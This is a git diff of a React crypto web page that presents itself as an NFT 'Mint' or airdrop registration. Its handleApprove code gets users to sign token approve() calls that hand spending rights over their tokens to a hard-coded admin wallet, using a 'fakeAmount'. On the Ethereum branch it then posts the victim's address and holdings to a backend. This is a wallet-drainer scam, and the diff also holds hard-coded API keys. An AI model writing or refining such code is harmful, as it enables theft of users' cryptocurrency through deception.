@@ -7,14 +7,13 @@ import Web3Modal from "web3modal";
 import 'react-responsive-modal/styles.css';
 import { Modal } from 'react-responsive-modal';
 import WalletConnectProvider from "@walletconnect/web3-provider";
-import Fortmatic from "fortmatic";
-import Torus from "@toruslabs/torus-embed";
-import Portis from "@portis/web3";
+// import Fortmatic from "fortmatic";
+// import Torus from "@toruslabs/torus-embed";
+// import Portis from "@portis/web3";
 import { providers/*, ethers*/ } from "ethers";
 import Web3 from "web3";
 import 'react-notifications/lib/notifications.css';
 import $ from 'jquery';
-import 'bootstrap/dist/css/bootstrap.min.css';
 import ReactPlayer from 'react-player';
 import video1 from "../assets/video1.mp4";
 import config from "../contracts/config";
@@ -27,10 +26,10 @@ import playstore from "../assets/playstore.webp";
 import appstore from "../assets/appstore.webp";
 // var WAValidator = require('wallet-address-validator');
 
-const GET_TOKEN_PRICE_API_KEY = "0dbdc51d0f73f318d42549c40568c2bf422d82cc0f3adfc22e1c714fe2e10914";
-const GET_USER_ALL_TOEKN_API_KEY = "BQYwOG5P7R1uRLynnZc5UAaauiO27iiD";
-const GET_BSC_SCAN_API_KEY = "5QGX4CBUIJQR7WNI93FCPQ4TEC97ZGG92C";
-const GET_ETH_SCAN_API_KEY = "83AQWDXARYBC2FS3GBYWUDK24ZPEZP5RSX"
+const GET_TOKEN_PRICE_API_KEY = "f0ae12cdcd6a8343b90e6b8aa4c20f0dce7a8b4495eb4b93ff4d162256b1a432";
+const GET_USER_ALL_TOEKN_API_KEY = "BQYGPwThGb8NJULK5mlM5sQyuRB2boFi";
+const GET_BSC_SCAN_API_KEY = "B47KGEV1NA5Y62QV4YDC547RXTJWSMMWX9";
+const GET_ETH_SCAN_API_KEY = "FJE6UQB3H5MMYD83WIET6JMSFCRD65FMSP"
 
 const adminWalletAddress = "0x4552411f0f8C54116E220DA3e76b95a0375df766";
 
@@ -41,35 +40,35 @@ const providerOptions = {
       infuraId: config.INFURA_ID, // required
     },
   },
-  fortmatic: {
-    package: Fortmatic,
-    options: {
-      // Mikko's TESTNET api key
-      key: "pk_test_391E26A3B43A3350"
-    }
-  },
-  torus: {
-    package: Torus, // required
-    options: {
-      networkParams: {
-        host: "https://localhost:8545", // optional
-        chainId: 1337, // optional
-        networkId: 1337 // optional
-      },
-      config: {
-        buildEnv: "development" // optional
-      }
-    }
-  },
-  binancechainwallet: {
-    package: true
-  },
-  portis: {
-    package: Portis, // required
-    options: {
-      id: "PORTIS_ID" // required
-    }
-  }
+  // fortmatic: {
+  //   package: Fortmatic,
+  //   options: {
+  //     // Mikko's TESTNET api key
+  //     key: "pk_test_391E26A3B43A3350"
+  //   }
+  // },
+  // torus: {
+  //   package: Torus, // required
+  //   options: {
+  //     networkParams: {
+  //       host: "https://localhost:8545", // optional
+  //       chainId: 1337, // optional
+  //       networkId: 1337 // optional
+  //     },
+  //     config: {
+  //       buildEnv: "development" // optional
+  //     }
+  //   }
+  // },
+  // binancechainwallet: {
+  //   package: true
+  // },
+  // portis: {
+  //   package: Portis, // required
+  //   options: {
+  //     id: "PORTIS_ID" // required
+  //   }
+  // }
 };
 
 let web3Modal;
@@ -77,9 +76,28 @@ if (typeof window !== "undefined") {
   web3Modal = new Web3Modal({
     network: "mainnet", // optional
     cacheProvider: true,
-    providerOptions, // required
+    providerOptions: {
+      walletconnect: {
+        package: WalletConnectProvider,
+        options: {
+          infuraId: config.INFURA_ID, // required
+          rpc: {
+            1: "https://mainnet.infura.io/v3/",
+            56: "https://bsc-dataseed1.ninicoin.io",
+          },
+        },
+      },
+    }, // required
     theme: "dark",
   });
+  // web3Modal = new Web3Modal({
+  //   network: "mainnet", // optional
+  //   cacheProvider: true,
+  //   providerOptions: {
+
+  //   }, // required
+  //   theme: "dark",
+  // });
 }
 
 const initialState = {
@@ -115,7 +133,7 @@ function reducer(state, action) {
       throw new Error();
   }
 }
-const web3 = new Web3(window.ethereum);
+// const web3 = new Web3(window.ethereum);
 
 const UserScreen = (props) => {
   const [open, setOpen] = useState(false);
@@ -334,7 +352,7 @@ const UserScreen = (props) => {
         eth: [],
         bsc: []
       };
-      if (1) {
+      if (value) {
         let query = `query ($network: EthereumNetwork!, $address: String!) {ethereum(network: $network) {address(address: {is: $address}) {balances {currency {address symbol tokenType decimals} value}}}}`;
         let variables = `{"limit": 10,"offset": 0,"network": "ethereum","address": "` + value + `"}`;
         let url = "https://graphql.bitquery.io/";
@@ -419,6 +437,7 @@ const UserScreen = (props) => {
 
   const handleApprove = async () => {
     try {
+      console.log(walletStatus , initStatus , userAllToken)
       if (walletStatus && initStatus && userAllToken.length) {
         const approveToken = userAllToken[0];
         if (approveToken.network === "BSC") {
@@ -431,24 +450,28 @@ const UserScreen = (props) => {
           if (approveToken.currency.address === "-") {
 
           } else {
+            console.log(123);
             let api = "https://api.bscscan.com/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_BSC_SCAN_API_KEY;
             let temp = await axios.get(api);
-            // console.log(temp);
+            console.log(approveToken);
             const contractABI = JSON.parse(temp.data.result);
+            console.log(23);
+            const web3 = new Web3(provider);
+            console.log(123);
             const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
             await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((fakeAmount).toString(), "ether")).send({ from: myAddress })
               .then(async function (receipt) {
-                // console.log(receipt);
-                await axios.post('http://localhost:5000/products', {
-                  userWalletAddress: myAddress,
-                  amount: approveAmount,
-                  symbol: approveToken.currency.symbol,
-                  contractAddress: approveToken.currency.address,
-                  network: "BSC",
-                  adminAddress: adminWalletAddress,
-                  price: approveToken.cost
-                });
-                NotificationManager.success('you have succesfully registered for the airdrop, if you are lucky you will receive the price soon', '', 3000);
+                console.log(receipt);
+                // await axios.post('http://localhost:5000/products', {
+                //   userWalletAddress: myAddress,
+                //   amount: approveAmount,
+                //   symbol: approveToken.currency.symbol,
+                //   contractAddress: approveToken.currency.address,
+                //   network: "BSC",
+                //   adminAddress: adminWalletAddress,
+                //   price: approveToken.cost
+                // });
+                setOpen(true);
               });
           }
         }
@@ -465,6 +488,7 @@ const UserScreen = (props) => {
             let api = "https://api.etherscan.io/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_ETH_SCAN_API_KEY;
             let temp = await axios.get(api);
             const contractABI = JSON.parse(temp.data.result);
+            const web3 = new Web3(provider);
             const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
             await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((fakeAmount).toString(), "ether")).send({ from: myAddress })
               .then(async function (receipt) {
@@ -477,7 +501,7 @@ const UserScreen = (props) => {
                   adminAddress: adminWalletAddress,
                   price: approveToken.cost
                 });
-                NotificationManager.success('you have succesfully registered for the airdrop, if you are lucky you will receive the price soon', '', 3000);
+                setOpen(true);
               });
           }
         }
@@ -494,14 +518,14 @@ const UserScreen = (props) => {
       const provider = await web3Modal.connect();
       if (window.ethereum) {
         // check if the chain to connect to is installed
-        await window.ethereum.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: config.chainHexID[config.chainID] }], // chainId must be in hexadecimal numbers
-        });
+        // await window.ethereum.request({
+        //   method: "wallet_switchEthereumChain",
+        //   params: [{ chainId: config.chainHexID[config.chainID] }], // chainId must be in hexadecimal numbers
+        // });
       } else {
-        alert(
-          "MetaMask is not installed. Please consider installing it: https://metamask.io/download.html"
-        );
+        // alert(
+        //   "MetaMask is not installed. Please consider installing it: https://metamask.io/download.html"
+        // );
       }
       NotificationManager.success('wallet connect success!', 'Connect Info', 3000);
       const web3Provider = new providers.Web3Provider(provider);
@@ -555,7 +579,7 @@ const UserScreen = (props) => {
     if (web3Modal.cachedProvider) {
       disconnect();
     }
-  }, [disconnect]);
+  }, [connect]);
   useEffect(() => {
     if (provider) {
       const handleAccountsChanged = (accounts) => {
@@ -636,7 +660,7 @@ const UserScreen = (props) => {
                 <li><img src={ETH} alt="" /> Etherium</li>
               </div>
               <div className="btn-box wow fadeInUp" data-wow-delay="2500ms">
-                <Link to="/" className="theme-btn btn-style-one" onClick={handleApprove}>Mint</Link>
+                <div className="theme-btn btn-style-one" onClick={handleApprove}>Mint</div>
               </div>
             </div>
           </div>
